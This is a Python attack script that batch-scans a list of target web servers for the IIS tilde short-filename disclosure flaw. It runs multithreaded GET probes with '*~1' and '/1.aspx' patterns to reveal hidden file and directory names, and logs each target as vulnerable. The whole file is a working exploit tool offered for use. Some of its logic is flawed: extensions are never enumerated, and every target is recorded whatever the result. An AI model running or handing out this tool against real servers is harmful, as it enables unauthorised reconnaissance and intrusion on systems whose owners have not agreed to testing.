import sys
import queue
import threading
import requests
import urllib.parse as urlparse


class Scanner:
    def __init__(self, target, proxies=None):
        self.target = target.lower()
        if not self.target.startswith("http"):
            self.target = f"http://{self.target}"
        self.scheme, self.netloc, self.path, _, _, _ = urlparse.urlparse(self.target)
        if not self.path.endswith("/"):
            self.path += "/"
        self.alphanum = "abcdefghijklmnopqrstuvwxyz0123456789_-"
        self.files = []
        self.dirs = []
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.proxies = proxies

    def _get_status(self, path):
        """
        通过 GET 请求获取路径的 HTTP 状态码
        """
        try:
            url = f"{self.scheme}://{self.netloc}{path}"
            response = requests.get(url, proxies=self.proxies, timeout=10)
            return response.status_code
        except Exception as e:
            raise Exception(f"[Error] Failed to get status for {path}: {e}")

    def run(self):
        """
        多线程扫描
        """
        for c in self.alphanum:
            self.queue.put((self.path + c, ".*"))
        threads = []
        for _ in range(20):
            t = threading.Thread(target=self._scan_worker)
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

    def report(self):
        """
        打印扫描结果
        """
        print(f"Results for {self.target}")
        for d in self.dirs:
            print(f"Dir:  {d}")
        for f in self.files:
            print(f"File: {f}")
        print("-" * 64)

    def save_vulnerable_target(self):
        """
        保存发现漏洞的目标
        """
        with open("result.txt", "a") as f:
            f.write(f"{self.target}\n")

    def _scan_worker(self):
        """
        扫描任务工作函数
        """
        while not self.queue.empty():
            try:
                url, ext = self.queue.get(timeout=1.0)
                status = self._get_status(url + "*~1" + ext + "/1.aspx")
                if status == 404:
                    print(f"[+] Found: {url}~1{ext}")
                    if len(url) - len(self.path) < 6:
                        for c in self.alphanum:
                            self.queue.put((url + c, ext))
                    elif ext == ".*":
                        self.queue.put((url, ""))
                    elif ext == "":
                        self.dirs.append(url + "~1")
                    else:
                        self.files.append(url + "~1" + ext)
            except queue.Empty:
                break
            except Exception as e:
                print(f"[Error] {e}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit_iis_shortname.py vulnerable_targets.txt")
        sys.exit(1)

    targets_file = sys.argv[1]
    proxies =None

    with open(targets_file, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    for target in targets:
        print(f"[*] Exploiting {target}...")
        scanner = Scanner(target, proxies=proxies)
        try:
            scanner.run()
            scanner.save_vulnerable_target()
        except Exception as e:
            print(f"[Error] {target} - {e}")
